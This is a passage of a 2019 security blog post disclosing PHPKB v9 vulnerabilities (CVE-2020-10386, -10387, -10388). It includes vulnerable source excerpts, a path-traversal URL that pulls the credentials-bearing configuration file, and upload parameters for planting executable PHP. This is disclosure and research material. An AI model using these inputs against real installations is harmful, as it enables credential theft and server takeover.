@@ -1,0 +1,897 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Analyzing PHPKB v9: Part one | Antonio Cannito</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Analyzing PHPKB v9: Part one" />
+<meta name="author" content="Antonio" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="The first part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Arbitrary File Download, Remote Code Execution, Blind Cross-Site Scripting, Arbitrary File Renaming, Arbitrary Folder Deletion, CSV Injection, Arbitrary File Listing." />
+<meta property="og:description" content="The first part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Arbitrary File Download, Remote Code Execution, Blind Cross-Site Scripting, Arbitrary File Renaming, Arbitrary Folder Deletion, CSV Injection, Arbitrary File Listing." />
+<link rel="canonical" href="https://antoniocannito.it/phpkb1" />
+<meta property="og:url" content="https://antoniocannito.it/phpkb1" />
+<meta property="og:site_name" content="Antonio Cannito" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-03-19T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Analyzing PHPKB v9: Part one" />
+<script type="application/ld+json">
+{"description":"The first part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Arbitrary File Download, Remote Code Execution, Blind Cross-Site Scripting, Arbitrary File Renaming, Arbitrary Folder Deletion, CSV Injection, Arbitrary File Listing.","url":"https://antoniocannito.it/phpkb1","@type":"BlogPosting","headline":"Analyzing PHPKB v9: Part one","dateModified":"2019-03-19T00:00:00+00:00","datePublished":"2019-03-19T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://antoniocannito.it/phpkb1"},"author":{"@type":"Person","name":"Antonio"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+
+  <!-- RSS -->
+  <link type="application/atom+xml" rel="alternate" href="https://antoniocannito.it/feed.xml" title="Antonio Cannito" />
+
+  <!-- Google Analytics-->
+  
+  <script>
+  window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+  ga('create', 'UA—XXXXXXXX-X', 'auto');
+  ga('send', 'pageview');
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+  
+</head>
+
+
+  <body>
+
+    <nav class="nav">
+  <div class="nav-container">
+    <a href="/">
+      <h2 class="nav-title">Antonio Cannito</h2>
+    </a>
+    <ul>
+      <li><a href="/">Home</a></li>
+      <li><a href="https://it.linkedin.com/in/antonio-cannito">Linkedin</a></li>
+            <li><a href="https://github.com/nitokhantonio">Github</a></li>
+      <li><a href="/pgp/">PGP Key</a></li>
+    </ul>
+  </div>
+</nav>
+
+
+    <main>
+      <div class="post">
+  <div class="post-info">
+    <span>Written by</span>
+    
+        Antonio
+    
+
+    
+      <br>
+      <span>on&nbsp;</span><time datetime="2019-03-19 00:00:00 +0000">March 19, 2019</time>
+    
+  </div>
+
+  <h1 class="post-title">Analyzing PHPKB v9: Part one</h1>
+  <div class="post-line"></div>
+
+  <p>This article has been split into three parts; other parts can be found below:</p>
+
+<p>Part 2: <a href="/phpkb2">Part 2</a></p>
+
+<p>Part 3: <a href="/phpkb3">Part 3</a></p>
+
+<p>UPDATE: the vulnerabilities have been fixed in PHPKB v9 P1-202005.</p>
+
+<h2 id="introduction">Introduction</h2>
+<p>PHPKB is a knowledge management software that allows you to share information with your customers and staff members. It reduces the time spent on customer support, improves the productivity of employees and saves precious time wasted on searching for information. A knowledgebase system enables your staff and customers to access information locally or online. Its powerful group-based permission structure with private categories makes it easy to target and deliver, content to specific groups of knowledge base readers. It has a lot of features such as creating, deleting and editing:</p>
+<ul>
+  <li>Categories</li>
+  <li>Articles and articles templates</li>
+  <li>Subscribers</li>
+  <li>Comments</li>
+  <li>Tickets</li>
+  <li>Glossary</li>
+  <li>News</li>
+  <li>Languages</li>
+  <li>Users</li>
+  <li>Groups</li>
+  <li>Statistics</li>
+  <li>Backup and restore</li>
+  <li>Sitemap</li>
+</ul>
+
+<p>The knowledgebase can be managed by different types of users, each of them having different roles:</p>
+<ul>
+  <li>Superuser</li>
+  <li>Editor</li>
+  <li>Writer</li>
+  <li>Translator</li>
+  <li>KB Users</li>
+</ul>
+
+<p>I’ve found different types of vulnerabilities, below there is an explanation for each of them:</p>
+<ul>
+  <li>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end-user. An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. There are different types of XSS:
+    <ul>
+      <li>Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser.</li>
+      <li>Persistent XSS attacks are possible when a website or web application stores user input and later serves it to other users. An application is vulnerable if it does not validate user input before storing content and embedding it into HTML response pages. Attackers use vulnerable web pages to inject malicious code and have it stored on the webserver for later use. The payload is automatically served to users who browse web pages and executed in their context. Thus, the victims do not need to click on a malicious link to run the payload (as in the case of Reflected XSS). All they have to do is visit a vulnerable web page.</li>
+      <li>Blind XSS vulnerabilities are a variant of persistent XSS vulnerabilities. They occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker’s payload will be loaded. The attacker input can be executed in a completely different application (for example an internal application where the administrator reviews the access logs or the application exceptions).</li>
+    </ul>
+  </li>
+  <li>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request;</li>
+  <li>Remote Code Execution: is a vulnerability that can be exploited if user input is injected into a file or a string and executed (evaluated) by the programming language’s parser. A Remote Code Evaluation can lead to a full compromise of the vulnerable web application and also web server;</li>
+  <li>Arbitrary File Download: many web applications have file download sections where a user can download one or more files of his choice. If the input is not properly sanitized before being used to retrieve files from the server, it can be exploited to download arbitrary files from the system via directory traversal attacks;</li>
+  <li>Arbitrary Folder Deletion (which is an uncommon vulnerability) happens when an attacker can traverse directories (go to upper directories) and delete any folders he wants. This could have catastrophic effects as an attacker could delete the whole web application, delete important folders from the operating system, delete the folder that contains the database or personal information and so on;</li>
+  <li>Arbitrary Files and Folder Listing: this vulnerability allows an attacker to list some (or all) filenames and folder currently stored in a webserver;</li>
+  <li>CSV Injection is known as Formula Injection, occurs when websites embed untrusted input inside CSV files. When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with ‘=’ will be interpreted by the software as a formula. Maliciously crafted formulas can be used for three key attacks:
+    <ul>
+      <li>Hijacking the user’s computer by exploiting vulnerabilities in the spreadsheet software;</li>
+      <li>Hijacking the user’s computer by exploiting the user’s tendency to ignore security warnings in spreadsheets that they downloaded from their own website;</li>
+      <li>Exfiltrating contents from the spreadsheet, or other open spreadsheets.</li>
+    </ul>
+  </li>
+  <li>Arbitrary File Renaming: (another uncommon vulnerability) allows a malicious user to rename files on the server (in PHPKB’s case only the filename, not the extension) causing a Denial of Service (DoS).</li>
+</ul>
+
+<p>Code snippets will be presented in order to explain the vulnerabilities and related exploits/proof of concepts.</p>
+
+<h2 id="authenticated-arbitrary-file-download-cve-2020-10387">Authenticated Arbitrary File Download (CVE-2020-10387)</h2>
+<p>Exploitable by: Superuser</p>
+
+<p>Vulnerable file: admin/download.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$authority_level</span> <span class="o">=</span> <span class="s1">'SEW'</span><span class="p">;</span> 
+<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/include/check-authority.php'</span><span class="p">);</span> <span class="c1">//Checks if we are logged in as Superuser/Translator/Writer/Editor</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'called'</span><span class="p">])</span><span class="o">==</span><span class="s1">'ajax'</span><span class="p">){</span> <span class="c1">//If the GET parameter 'called' is set to ajax</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'session_admin_level'</span><span class="p">]</span><span class="o">==</span><span class="s1">'Superuser'</span><span class="p">){</span><span class="c1">//If the logged in user is a Superuser then the backup functions are loaded</span>
+		<span class="k">include_once</span><span class="p">(</span><span class="s1">'include/functions-backup.php'</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="c1">//Skipped some code</span>
+		<span class="k">case</span> <span class="s1">'backup-lang'</span><span class="o">:</span>
+			<span class="nv">$file</span>	<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]);</span> <span class="c1">// The GET parameter file contains the file that is going to be downloaded</span>
+			<span class="nv">$folder</span>	<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'act'</span><span class="p">])</span><span class="o">==</span><span class="s1">'backup-conf'</span><span class="o">?</span><span class="s1">'include/'</span><span class="o">:</span><span class="s1">'languages/'</span><span class="p">;</span>
+			<span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$folder</span><span class="mf">.</span><span class="nv">$file</span><span class="p">)){</span>
+				<span class="nv">$code</span>		<span class="o">=</span> <span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'act'</span><span class="p">])</span><span class="o">==</span><span class="s1">'backup-conf'</span><span class="o">?</span><span class="s1">''</span><span class="o">:</span><span class="s1">'language-'</span><span class="p">)</span><span class="mf">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">strrpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s1">'.'</span><span class="p">));</span>
+				<span class="nv">$file_name</span>	<span class="o">=</span> <span class="nf">Get_Filename</span><span class="p">(</span><span class="nv">$code</span><span class="p">,</span> <span class="s1">'.bak'</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+				<span class="nv">$data</span>		<span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$folder</span><span class="mf">.</span><span class="nv">$file</span><span class="p">);</span> <span class="c1">// The PHP file_get_contents is used to retrieve the content of a file into a string</span>
+				<span class="nf">Download_File</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span> <span class="c1">//Then the file is downloaded</span>
+				<span class="k">exit</span><span class="p">();</span>
+			<span class="p">}</span></code></pre></figure>
+
+<p>As we can see, user input is directly passed to file_get_contents without any filtering, we can use ../ to download files from upper directories. This proof of concept will download PHPKB’s configuration file, exposing SMPT and database credentials:</p>
+
+<p><code class="language-plaintext highlighter-rouge">[PHPKB]/admin/download.php?called=ajax&amp;act=backup-lang&amp;file=../include/configuration.php</code></p>
+
+<p><a href="https://vimeo.com/490369442">Video</a></p>
+
+<h2 id="remote-code-execution-cve-2020-10386">Remote Code Execution (CVE-2020-10386)</h2>
+<p>Exploitable by: Superuser/Editor/Writer/Translator</p>
+
+<p>Vulnerable file: admin/imagepaster/image-upload.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin_id_Session_ML'</span><span class="p">]</span><span class="o">==</span><span class="s1">''</span><span class="o">||</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin_username_Session_ML'</span><span class="p">]</span><span class="o">==</span><span class="s1">''</span><span class="p">){</span> <span class="c1">// Checks if we are logged in</span>
+	<span class="nf">json_error</span><span class="p">(</span><span class="s1">'Access Denied. Please login to continue.'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="c1">// Skipped some code</span>
+<span class="nv">$mime</span> <span class="o">=</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'imgMime'</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'imgMime'</span><span class="p">]</span> <span class="o">:</span> <span class="kc">null</span><span class="p">;</span> <span class="c1">// The POST parameter imgMime is used to specify the Mime Type of the image</span>
+<span class="nv">$name</span> <span class="o">=</span> <span class="o">!</span><span class="nb">empty</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'imgName'</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'imgName'</span><span class="p">]</span> <span class="o">:</span> <span class="kc">null</span><span class="p">;</span> <span class="c1">// The POST parameter imgName is used to specify the filename </span>
+<span class="c1">// Skipped some code</span>
+<span class="nv">$parts</span> 	<span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$mime</span><span class="p">);</span> <span class="c1">// Split the Mime Type string at the slash</span>
+<span class="nv">$ext</span> 	<span class="o">=</span> <span class="nb">empty</span><span class="p">(</span> <span class="nv">$parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">?</span> <span class="s1">'png'</span> <span class="o">:</span> <span class="nv">$parts</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// If the part after the slash is empty, set the file extension to png, else set the file extension to the string after the slash</span>
+<span class="c1">// Skipped some code, file is uploaded to a temporary fixed directory</span>
+<span class="nv">$target</span> <span class="o">=</span> <span class="nv">$targetPath</span><span class="mf">.</span><span class="s1">'/'</span><span class="mf">.</span><span class="nv">$imageName</span><span class="mf">.</span><span class="s1">'.'</span><span class="mf">.</span><span class="nv">$ext</span><span class="p">;</span> <span class="c1">// There are two vulnerabilities here, the former is that $imageName is not filtered so we can move in upper directories, the latter is that $ext is not checked against a whitelist or blacklist, so we can control directly the file extension</span>
+	<span class="nv">$source</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">'file'</span><span class="p">][</span><span class="s1">'tmp_name'</span><span class="p">];</span> <span class="c1">// Grabbing temporary file location</span>
+	<span class="nb">move_uploaded_file</span><span class="p">(</span> <span class="nv">$source</span><span class="p">,</span> <span class="nv">$target</span> <span class="p">);</span> <span class="c1">// Moving file to from the temporary directory to the chosen directory</span></code></pre></figure>
+
+<p>This file is called when the current logged in user tries to drop a file into the WYSIWYG editor. We are going to put our proof of concept file under the /js/ directory as there is no .htaccess file blocking the upload. To exploit this vulnerability, an attacker must set the imgMime POST parameter to image/php, the imgName POST parameter to ../js/example.php and the proof of concept file that is going to be dragged and dropped must contain executable code:</p>
+
+<p><a href="https://vimeo.com/490369951">Video</a></p>
+
+<h2 id="blind-cross-site-scripting-cve-2020-10388">Blind Cross-Site Scripting (CVE-2020-10388)</h2>
+<p>Exploitable by: Anyone, even external users</p>
+
+<p>Vulnerable file: include/functions-articles.php (linked to article.php, exploitable via the Referer header), triggered at admin/report-referrers.php</p>
+
+<p>File: article.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some includes</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'include/functions.php'</span><span class="p">);</span> <span class="c1">// Includes common functions inside article.php</span>
+<span class="c1">// Skipping some code and includes</span>
+		<span class="nf">Knowledgebase_Analytics</span><span class="p">();</span> <span class="c1">// Vulnerable function is called, we need to dig into include/functions.php</span></code></pre></figure>
+
+<p>File: include/functions.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code and includes</span>
+	<span class="k">case</span> <span class="s1">'article.php'</span><span class="o">:</span>
+		<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/functions-inline-edit.php'</span><span class="p">);</span> <span class="c1">// The function Knowledgebase_Analytics(); isn't found here</span>
+		<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/functions-article.php'</span><span class="p">);</span> <span class="c1">// The function Knowledgebase_Analytics(); is detailed here</span>
+		<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/functions-articles-display.php'</span><span class="p">);</span> <span class="c1">// The function Knowledgebase_Analytics(); isn't found here</span>
+		<span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>File:  include/functions-articles.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code</span>
+<span class="k">function</span> <span class="n">Knowledgebase_Analytics</span><span class="p">()</span> <span class="c1">//The function is defined here</span>
+<span class="p">{</span> <span class="c1">// Skipping some code</span>
+		<span class="nv">$referrer_url</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_REFERER'</span><span class="p">]);</span> <span class="c1">//The header is grabbed and url encoded</span>
+<span class="c1">// Skipping sanitization code (anti sql-injection) (although I wish it wasn't sanitized :P)</span>
+		<span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'connection'</span><span class="p">],</span> <span class="s2">"INSERT INTO phpkb_referrers (referrer,referrer_url,referrer_date_time,article_id) VALUES('</span><span class="nv">$referrer</span><span class="s2">','</span><span class="nv">$referrer_url</span><span class="s2">',NOW(),</span><span class="si">{</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'artid'</span><span class="p">]</span><span class="si">}</span><span class="s2">)"</span><span class="p">);</span> <span class="c1">//The header is saved into the database</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>In the last step, the Referer header is saved into the database. The file admin/report-referrers.php allows a Superuser to check all the Referer headers that have been submitted to the knowledgebase:</p>
+
+<p>File: admin/report-referrers.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$authority_level</span><span class="o">=</span> <span class="s1">'S'</span><span class="p">;</span> <span class="c1">//Accessible only by the admin</span>
+<span class="c1">// Skipping some code</span>
+<span class="c1">//$google/$yahoo/$bing/$other is the number of Referer headers sorted by hostname</span>
+<span class="c1">//$date_range, is used when we want to restrict the search of Referer headers by date</span>
+<span class="c1">//$id is used when we want to search for Referer headers tied to a specific article, rather than all articles</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$google</span><span class="p">){</span>
+	<span class="nv">$google</span>	<span class="o">=</span> <span class="s2">"&lt;a id=</span><span class="se">\"</span><span class="s2">google_link_id</span><span class="se">\"</span><span class="s2"> href=</span><span class="se">\"</span><span class="s2">javascript:;</span><span class="se">\"</span><span class="s2"> onclick=</span><span class="se">\"</span><span class="s2">javascript:commonOperations('referrer-detail||google_output||google_link_id||google||via-link||</span><span class="si">{</span><span class="nv">$google</span><span class="si">}</span><span class="s2">||</span><span class="si">{</span><span class="nv">$date_range</span><span class="si">}</span><span class="s2">||0||</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">||1');</span><span class="se">\"</span><span class="s2"> title=</span><span class="se">\"</span><span class="s2">View Detail</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$google</span><span class="si">}</span><span class="s2"> &lt;i class=</span><span class="se">\"</span><span class="s2">fa fa-chevron-circle-down text-primary</span><span class="se">\"</span><span class="s2">&gt;&lt;/i&gt;&lt;/a&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$yahoo</span><span class="p">){</span>
+	<span class="nv">$yahoo</span>	<span class="o">=</span> <span class="s2">"&lt;a id=</span><span class="se">\"</span><span class="s2">yahoo_link_id</span><span class="se">\"</span><span class="s2"> href=</span><span class="se">\"</span><span class="s2">javascript:;</span><span class="se">\"</span><span class="s2"> onclick=</span><span class="se">\"</span><span class="s2">javascript:commonOperations('referrer-detail||yahoo_output||yahoo_link_id||yahoo||via-link||</span><span class="si">{</span><span class="nv">$yahoo</span><span class="si">}</span><span class="s2">||</span><span class="si">{</span><span class="nv">$date_range</span><span class="si">}</span><span class="s2">||0||</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">||1');</span><span class="se">\"</span><span class="s2"> title=</span><span class="se">\"</span><span class="s2">View Detail</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$yahoo</span><span class="si">}</span><span class="s2"> &lt;i class=</span><span class="se">\"</span><span class="s2">fa fa-chevron-circle-down text-primary</span><span class="se">\"</span><span class="s2">&gt;&lt;/i&gt;&lt;/a&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$bing</span><span class="p">){</span>
+	<span class="nv">$bing</span>	<span class="o">=</span> <span class="s2">"&lt;a id=</span><span class="se">\"</span><span class="s2">bing_link_id</span><span class="se">\"</span><span class="s2"> href=</span><span class="se">\"</span><span class="s2">javascript:;</span><span class="se">\"</span><span class="s2"> onclick=</span><span class="se">\"</span><span class="s2">javascript:commonOperations('referrer-detail||bing_output||bing_link_id||bing||via-link||</span><span class="si">{</span><span class="nv">$bing</span><span class="si">}</span><span class="s2">||</span><span class="si">{</span><span class="nv">$date_range</span><span class="si">}</span><span class="s2">||0||</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">||1');</span><span class="se">\"</span><span class="s2"> title=</span><span class="se">\"</span><span class="s2">View Detail</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$bing</span><span class="si">}</span><span class="s2"> &lt;i class=</span><span class="se">\"</span><span class="s2">fa fa-chevron-circle-down text-primary</span><span class="se">\"</span><span class="s2">&gt;&lt;/i&gt;&lt;/a&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$other</span><span class="p">){</span>
+	<span class="nv">$other</span> <span class="o">=</span> <span class="s2">"&lt;a id=</span><span class="se">\"</span><span class="s2">other_link_id</span><span class="se">\"</span><span class="s2"> href=</span><span class="se">\"</span><span class="s2">javascript:;</span><span class="se">\"</span><span class="s2"> onclick=</span><span class="se">\"</span><span class="s2">javascript:commonOperations('referrer-detail||other_output||other_link_id||other||via-link||</span><span class="si">{</span><span class="nv">$other</span><span class="si">}</span><span class="s2">||</span><span class="si">{</span><span class="nv">$date_range</span><span class="si">}</span><span class="s2">||0||</span><span class="si">{</span><span class="nv">$id</span><span class="si">}</span><span class="s2">||1');</span><span class="se">\"</span><span class="s2"> title=</span><span class="se">\"</span><span class="s2">View Detail</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$other</span><span class="si">}</span><span class="s2"> &lt;i class=</span><span class="se">\"</span><span class="s2">fa fa-chevron-circle-down text-primary</span><span class="se">\"</span><span class="s2">&gt;&lt;/i&gt;&lt;/a&gt;"</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>As we can see, the Referer retrieval is done by a Javascript function. Two external Javascript file are included in the page:</p>
+
+<p>File: admin/report-referrers.php</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"js/ajax.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"js/common.js?v1.0.5"</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;&lt;/script&gt;</span></code></pre></figure>
+
+<p>The first javascript file contains the ajaxObj function, which is a XMLHttpRequest custom wrapper, the second javascript file details how the Referer headers are retrieved from the database.</p>
+
+<p>File: js/common.js</p>
+
+<figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="c1">// Skipping some code</span>
+<span class="kd">function</span> <span class="nx">commonOperations</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">_array</span>	<span class="o">=</span> <span class="nx">params</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">||</span><span class="dl">'</span><span class="p">);</span> <span class="c1">//A string is split using the || delimiter</span>
+<span class="c1">// Skipping some code</span>
+<span class="c1">// The function commonOperations is a very large function with a lot of switches, we'll focus on the vulnerable case</span>
+		<span class="k">case</span> <span class="dl">'</span><span class="s1">referrer-detail</span><span class="dl">'</span><span class="p">:</span> <span class="c1">// Show referrer detail for selected period</span>
+			<span class="kd">var</span> <span class="nx">_tr_id</span> <span class="o">=</span> <span class="nx">_array</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1">_tr</span><span class="dl">'</span><span class="p">;</span>
+			<span class="kd">var</span> <span class="nx">_vis</span><span class="o">=</span> <span class="nx">jQuery</span><span class="p">(</span><span class="dl">'</span><span class="s1">#</span><span class="dl">'</span><span class="o">+</span><span class="nx">_tr_id</span><span class="p">).</span><span class="nx">is</span><span class="p">(</span><span class="dl">"</span><span class="s2">:visible</span><span class="dl">"</span><span class="p">);</span>
+			<span class="kd">var</span> <span class="nx">_hid</span><span class="o">=</span> <span class="nx">jQuery</span><span class="p">(</span><span class="dl">'</span><span class="s1">#</span><span class="dl">'</span><span class="o">+</span><span class="nx">_tr_id</span><span class="p">).</span><span class="nx">is</span><span class="p">(</span><span class="dl">"</span><span class="s2">:hidden</span><span class="dl">"</span><span class="p">);</span>
+ 
+			<span class="k">if</span><span class="p">(</span><span class="nx">_array</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">==</span><span class="dl">'</span><span class="s1">via-btn</span><span class="dl">'</span><span class="p">){</span>
+				<span class="c1">// Do nothing...</span>
+			<span class="p">}</span>
+			<span class="k">else</span><span class="p">{</span>
+				<span class="nx">jQuery</span><span class="p">(</span><span class="dl">'</span><span class="s1">#</span><span class="dl">'</span><span class="o">+</span><span class="nx">_tr_id</span><span class="p">).</span><span class="nx">toggle</span><span class="p">({</span><span class="na">easing</span><span class="p">:</span> <span class="dl">'</span><span class="s1">swing</span><span class="dl">'</span><span class="p">});</span>
+			<span class="p">}</span>
+ 
+			<span class="k">if</span><span class="p">((</span><span class="o">!</span><span class="nx">_vis</span> <span class="o">&amp;&amp;</span> <span class="nx">_hid</span><span class="p">)</span><span class="o">||</span><span class="nx">_array</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">==</span><span class="dl">'</span><span class="s1">via-btn</span><span class="dl">'</span><span class="p">){</span>
+				<span class="nx">_call</span>		<span class="o">=</span> <span class="dl">'</span><span class="s1">yes</span><span class="dl">'</span><span class="p">;</span>
+				<span class="nx">_divid</span>		<span class="o">=</span> <span class="nx">_array</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+				<span class="nx">jQuery</span><span class="p">(</span><span class="dl">'</span><span class="s1">#</span><span class="dl">'</span><span class="o">+</span><span class="nx">_array</span><span class="p">[</span><span class="mi">2</span><span class="p">]).</span><span class="nx">html</span><span class="p">(</span><span class="nx">_array</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">+</span><span class="dl">'</span><span class="s1"> &lt;i class="fa fa-chevron-circle-up text-danger"&gt;&lt;/i&gt;</span><span class="dl">'</span><span class="p">);</span>
+				<span class="kd">var</span> <span class="nx">_range</span>	<span class="o">=</span> <span class="nx">_array</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
